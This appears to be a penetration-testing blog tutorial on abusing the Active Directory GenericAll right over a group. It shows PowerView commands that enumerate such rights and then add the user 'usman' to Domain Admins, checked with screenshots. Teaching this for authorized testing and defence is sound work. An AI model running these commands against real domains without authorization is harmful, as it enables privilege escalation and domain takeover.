---
title:  GenericAll On Group
date: 2022-06-03 05:49:33 +0800
categories: [Infrastructure Pentesting, Active Directory]
tags: []  
---

# GenericAll

***GenericAll*** : Is a permission that gives full rights to an active directory objects. If you have `GenericAll` on group object, you can add users to the group.

# Enumeration

## PowerView

### GenericAll Enumeration 

We will get current user's sid by executing `whoami /user`, import powerview, then execute the below command to get the list of objects on which we have `GenericAll` right.

Command
```powershell

get-objectacl -resolveguids | ? {($_.securityidentifier -eq "[our_current_user_sid]") -and ($_.activedirectoryrights -eq "GenericAll")}

```

Below image shows the current user `usman` has GenericAll right on `Domain Admins` group.

![aclgroupgenall](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/aclgroupgenall2.png)

## BloodHound

We can also get thesame result using bloodhound.

Below image shows the current user `usman` has GenericAll right on `Domain Admins` group.

![acl](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/aclgroupgenall1.png)

# Exploitation

Let's check our current group.

![acl](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/aclgroupgenall3.png)

Here `usman` is a member of `Domain Users` group. We are going to exploit `GenericAll` to add `usman` to `Domain Admins`.

## PowerView

Since we have `GenericAll` right on `Domain Admins` group, we can add `usman` to the group by executing the below command

Command

```powershell
add-domaingroupmember -identity "Domain Admins" -members usman

```

![acl](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/aclgroupgenall4.png)

Let's check it by executing `get-netgroup -memberidentity usman`

![acl](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/ipentest/aclgroupgenall4.png)

As you can see, `usman` has been added to `Domain Admins` group.
	
# References

- [https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)
